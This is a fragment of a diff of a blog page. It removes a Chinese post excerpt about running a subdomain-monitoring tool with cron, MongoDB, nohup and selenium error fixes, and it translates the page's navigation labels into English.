-<p>crontab定时执行任务：<a href="https://www.jianshu.com/p/838db0269fd0" target="_blank" rel="noopener">https://www.jianshu.com/p/838db0269fd0</a></p>
-<p>crontab文件如下，每天12点执行：</p>
-<pre><code># everday 12:00 am exec
-0 0 17 * * ? python /home/get_domain/while_update.py
-
-</code></pre><p>注意最后要留个空行</p>
-<h1 id="Mongodb操作"><a href="#Mongodb操作" class="headerlink" title="Mongodb操作"></a>Mongodb操作</h1><p>更新，否则无法进行对比，更新状态到0</p>
-<pre><code>db.getCollection(&#39;xxx&#39;).update({&#39;state&#39;:1},{$set:{&#39;state&#39;: NumberInt(0)}},{multi:true})
-</code></pre><h1 id="一直运行random-start"><a href="#一直运行random-start" class="headerlink" title="一直运行random_start"></a>一直运行random_start</h1><pre><code>nohup python -u random_start.py &gt; nohup.log 2&gt;&amp;1 &amp;</code></pre><p>记得修改random_start的代码为while 1<br>可以修改五次config,运行五个后台程序</p>
-<h1 id="各种报错解决"><a href="#各种报错解决" class="headerlink" title="各种报错解决"></a>各种报错解决</h1><h2 id="报错代码127"><a href="#报错代码127" class="headerlink" title="报错代码127"></a>报错代码127</h2><pre><code>selenium.common.exceptions.WebDriverException: Message: Service chromedriver unexpectedly exited. Status code was: 127</code></pre><p>原因是browser版本过低，跟driver不匹配，升级browser</p>
-<pre><code>apt-get install chromium-browser</code></pre><h2 id="权限报错"><a href="#权限报错" class="headerlink" title="权限报错"></a>权限报错</h2><pre><code>selenium.common.exceptions.WebDriverException: Message: unknown error: Chrome failed to start: exited abnormall</code></pre><p>chromedriver在py程序里没权限，修改代码Browser.py</p>
-<pre><code>chrome_options.add_argument(&#39;--headless&#39;)
-chrome_options.add_argument(&#39;--no-sandbox&#39;) </code></pre><h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><p>安装mongodb:<a href="https://www.jianshu.com/p/5598f1dcbb98" target="_blank" rel="noopener">https://www.jianshu.com/p/5598f1dcbb98</a></p>
-
-                
-            </div>
-            <div class="continue">
-            <a href="/2019/03/30/Ubuntu16.04搭建子域名监控服务Get_domain/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -1148,7 +1518,7 @@ chrome_options.add_argument(&#39;--no-sandbox&#39;) </code></pre><h1 id="相关�
 </section>
 
   <nav class="page-nav">
-    <a class="extend prev" rel="prev" href="/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/3/">下一页 &raquo;</a>
+    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
   </nav>
 
     </main>
